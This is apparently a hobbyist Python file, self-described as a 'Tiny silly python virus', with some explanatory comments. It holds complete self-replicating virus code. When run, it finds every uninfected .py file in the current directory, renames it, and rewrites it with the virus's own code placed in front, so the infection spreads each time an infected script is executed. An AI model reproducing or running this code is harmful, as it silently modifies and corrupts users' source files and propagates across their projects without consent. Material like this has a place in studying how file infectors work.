# MAGIC_CODE_SKD2835
import os
import __main__
import random

def infect(filename):
	os.rename(filename, filename + '~')
	destination = open(filename, 'w')
	source = open(filename + '~', 'r')
	# __file__ is the pathname of the file from which the module was loaded, 
	# if it was loaded from a file. 
	# When the Python interpreter reads a source file, 
	# it executes all of the code found in it. Before executing the code, 
	# it will define a few special variables. 
	# For example, if the python interpreter is running that module (the source file) 
	# as the main program, it sets the special __name__ variable to have a value 
	# "__main__". 
	# If this file is being imported from another module, 
	# __name__ will be set to the module's name.
	this = open(__main__.__file__, 'r')

	for line in this:
		destination.write(line)
		if line.startswith("# MAGIC_CODE_SKD2835MDB"):
			break

	for line in source:
		destination.write(line)

	source.close()
	destination.close()
	this.close()

def is_infected(filename):
	f = open(filename, 'r')
	return f.readline().startswith("# MAGIC_CODE_SKD2835")

def find_and_infect_files():
	path = '.'
	dirs = os.listdir(path)
	for filename in dirs:
		if filename.endswith('.py') and not is_infected(filename):
			infect(filename)

find_and_infect_files()
print('---Tiny silly python virus---')
# MAGIC_CODE_SKD2835MDB
# 
# This line should not be written into file
#
# TBC
